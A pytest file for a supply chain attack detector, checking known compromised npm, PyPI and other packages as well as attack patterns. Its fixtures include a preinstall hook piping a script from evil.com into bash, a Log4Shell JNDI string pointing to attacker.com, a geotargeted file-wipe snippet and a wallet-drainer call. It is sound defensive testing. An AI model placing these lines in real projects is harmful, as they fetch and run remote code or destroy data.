# SupplyGraph - Comprehensive Historic Supply Chain Attack Detector Tests
import pytest
from app.detectors.historic_attacks import HistoricAttackDetector, KNOWN_COMPROMISED_PACKAGES
from app.models.core import SBOMComponent, Ecosystem, Severity, FindingType


@pytest.fixture
def detector():
    return HistoricAttackDetector()


class TestHistoricAttackPackageSignatures:
    """Tests checking known compromised packages from historic real-world supply chain attacks."""

    def test_detects_event_stream_and_flatmap_stream(self, detector):
        components = [
            SBOMComponent(
                bom_ref="event-stream-3.3.6",
                name="event-stream",
                version="3.3.6",
                ecosystem=Ecosystem.NPM,
                purl="pkg:npm/event-stream@3.3.6",
                is_direct=True,
                depth=1
            ),
            SBOMComponent(
                bom_ref="flatmap-stream-0.1.1",
                name="flatmap-stream",
                version="0.1.1",
                ecosystem=Ecosystem.NPM,
                purl="pkg:npm/flatmap-stream@0.1.1",
                is_direct=False,
                depth=2
            )
        ]
        ev = detector.check_components(components)
        assert len(ev) == 2
        findings = detector.create_findings(ev, "test-scan-1")
        assert len(findings) == 2
        titles = [f.title for f in findings]
        assert any("event-stream" in t for t in titles)
        assert any("flatmap-stream" in t for t in titles)
        assert all(f.severity == Severity.CRITICAL for f in findings)

    def test_detects_rest_client_compromised_version(self, detector):
        components = [
            SBOMComponent(
                bom_ref="rest-client-1.6.13",
                name="rest-client",
                version="1.6.13",
                ecosystem=Ecosystem.UNKNOWN,
                purl="pkg:gem/rest-client@1.6.13",
                is_direct=True,
                depth=1
            )
        ]
        ev = detector.check_components(components)
        assert len(ev) == 1
        assert ev[0].raw_data["year"] == 2019
        assert "pastebin" in ev[0].description.lower()

    def test_detects_ua_parser_js_and_coa_and_rc(self, detector):
        components = [
            SBOMComponent(bom_ref="ua-1", name="ua-parser-js", version="0.7.29", ecosystem=Ecosystem.NPM, purl="pkg:npm/ua-parser-js@0.7.29", is_direct=True, depth=1),
            SBOMComponent(bom_ref="coa-1", name="coa", version="2.0.3", ecosystem=Ecosystem.NPM, purl="pkg:npm/coa@2.0.3", is_direct=True, depth=1),
            SBOMComponent(bom_ref="rc-1", name="rc", version="1.2.9", ecosystem=Ecosystem.NPM, purl="pkg:npm/rc@1.2.9", is_direct=True, depth=1)
        ]
        ev = detector.check_components(components)
        assert len(ev) == 3
        findings = detector.create_findings(ev, "test-scan-2")
        assert len(findings) == 3
        assert all(f.severity == Severity.CRITICAL for f in findings)

    def test_detects_colors_and_faker_protestware(self, detector):
        components = [
            SBOMComponent(bom_ref="c-1", name="colors", version="1.4.44-liberty-2", ecosystem=Ecosystem.NPM, purl="pkg:npm/colors@1.4.44-liberty-2", is_direct=True, depth=1),
            SBOMComponent(bom_ref="f-1", name="faker", version="6.6.6", ecosystem=Ecosystem.NPM, purl="pkg:npm/faker@6.6.6", is_direct=True, depth=1)
        ]
        ev = detector.check_components(components)
        assert len(ev) == 2
        findings = detector.create_findings(ev, "test-scan-3")
        assert len(findings) == 2
        assert any("colors.js" in f.title for f in findings)
        assert any("faker.js" in f.title for f in findings)

    def test_detects_node_ipc_and_peacenotwar(self, detector):
        components = [
            SBOMComponent(bom_ref="n-1", name="node-ipc", version="10.1.1", ecosystem=Ecosystem.NPM, purl="pkg:npm/node-ipc@10.1.1", is_direct=True, depth=1),
            SBOMComponent(bom_ref="p-1", name="peacenotwar", version="1.0.0", ecosystem=Ecosystem.NPM, purl="pkg:npm/peacenotwar@1.0.0", is_direct=False, depth=2)
        ]
        ev = detector.check_components(components)
        assert len(ev) == 2
        assert any("peacenotwar" in e.description for e in ev)

    def test_detects_pytorch_torchtriton_dependency_confusion(self, detector):
        components = [
            SBOMComponent(bom_ref="t-1", name="torchtriton", version="2.0.0", ecosystem=Ecosystem.PYPI, purl="pkg:pypi/torchtriton@2.0.0", is_direct=True, depth=1)
        ]
        ev = detector.check_components(components)
        assert len(ev) == 1
        assert ev[0].raw_data["year"] == 2022
        findings = detector.create_findings(ev, "test-scan-4")
        assert findings[0].finding_type == FindingType.DEPENDENCY_CONFUSION

    def test_detects_ledger_connect_kit_and_lottie_player(self, detector):
        components = [
            SBOMComponent(bom_ref="l-1", name="@ledgerhq/connect-kit", version="1.1.6", ecosystem=Ecosystem.NPM, purl="pkg:npm/%40ledgerhq/connect-kit@1.1.6", is_direct=True, depth=1),
            SBOMComponent(bom_ref="lp-1", name="@lottiefiles/lottie-player", version="2.0.6", ecosystem=Ecosystem.NPM, purl="pkg:npm/%40lottiefiles/lottie-player@2.0.6", is_direct=True, depth=1)
        ]
        ev = detector.check_components(components)
        assert len(ev) == 2
        findings = detector.create_findings(ev, "test-scan-5")
        assert len(findings) == 2
        assert any("Ledger" in f.title for f in findings)
        assert any("Lottie-Player" in f.title for f in findings)

    def test_detects_xz_utils_cve_2024_3094(self, detector):
        components = [
            SBOMComponent(bom_ref="xz-1", name="xz", version="5.6.0", ecosystem=Ecosystem.UNKNOWN, purl="pkg:generic/xz@5.6.0", is_direct=True, depth=1)
        ]
        ev = detector.check_components(components)
        assert len(ev) == 1
        assert "CVE-2024-3094" in ev[0].description


class TestHistoricAttackSemanticHeuristics:
    """Tests checking code and CI/CD semantic signatures for historic supply chain attacks."""

    def test_detects_malicious_lifecycle_script_ua_parser_vector(self, detector):
        package_json = """{
            "name": "malicious-app",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "curl -s http://evil.com/payload.sh | bash",
                "start": "node index.js"
            }
        }"""
        ev = detector.check_manifest_lifecycle_scripts("package.json", package_json)
        assert len(ev) == 1
        assert "ua-parser-js" in ev[0].description
        assert ev[0].source_location.file == "package.json"

    def test_detects_polyfill_io_compromised_cdn(self, detector):
        html_code = """
        <!DOCTYPE html>
        <html>
        <head>
            <script src="https://cdn.polyfill.io/v3/polyfill.min.js"></script>
        </head>
        <body>Hello</body>
        </html>
        """
        ev = detector.check_source_code("public/index.html", html_code)
        assert len(ev) >= 1
        assert any("polyfill.io" in e.description.lower() for e in ev)

    def test_detects_external_script_missing_sri(self, detector):
        html_code = """
        <html>
        <head>
            <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
        </head>
        </html>
        """
        ev = detector.check_source_code("index.html", html_code)
        assert any("Subresource Integrity" in e.description for e in ev)

    def test_detects_log4shell_jndi_injection_string(self, detector):
        java_code = """
        public class App {
            public static void main(String[] args) {
                logger.info("User input: ${jndi:ldap://attacker.com/exploit}");
            }
        }
        """
        ev = detector.check_source_code("App.java", java_code)
        assert len(ev) == 1
        assert "Log4Shell" in ev[0].description

    def test_detects_web3_wallet_drainer_pattern(self, detector):
        js_code = """
        async function connect() {
            await window.ethereum.request({ method: 'eth_sendTransaction', params: [drainParams] });
        }
        """
        ev = detector.check_source_code("wallet.js", js_code)
        assert len(ev) == 1
        assert "drainer" in ev[0].description.lower()

    def test_detects_node_ipc_geotargeted_file_wipe(self, detector):
        js_code = """
        fetch('https://ip-api.com/json').then(r => r.json()).then(geo => {
            if (geo.countryCode === 'RU' || geo.country === 'Russia') {
                fs.unlinkSync('/critical/file');
            }
        });
        """
        ev = detector.check_source_code("index.js", js_code)
        assert len(ev) == 1
        assert "node-ipc" in ev[0].description

    def test_detects_codecov_bash_uploader_pipe(self, detector):
        workflow_yml = """
        name: CI
        jobs:
          test:
            runs-on: ubuntu-latest
            steps:
              - uses: actions/checkout@v4
              - name: Upload to Codecov
                run: curl -s https://codecov.io/bash | bash
        """
        ev = detector.check_cicd_workflow(".github/workflows/ci.yml", workflow_yml)
        assert len(ev) == 1
        assert "Codecov" in ev[0].description
        assert ev[0].raw_data["year"] == 2021

    def test_detects_solarwinds_prebuild_source_tamper(self, detector):
        workflow_yml = """
        name: Build
        jobs:
          compile:
            runs-on: windows-latest
            steps:
              - name: Patch source
                run: sed -i 's/ORIG/BACKDOOR/g' CoreApp.cs
              - name: Compile
                run: msbuild Solution.sln
        """
        ev = detector.check_cicd_workflow(".github/workflows/build.yml", workflow_yml)
        assert len(ev) == 1
        assert "SolarWinds" in ev[0].description
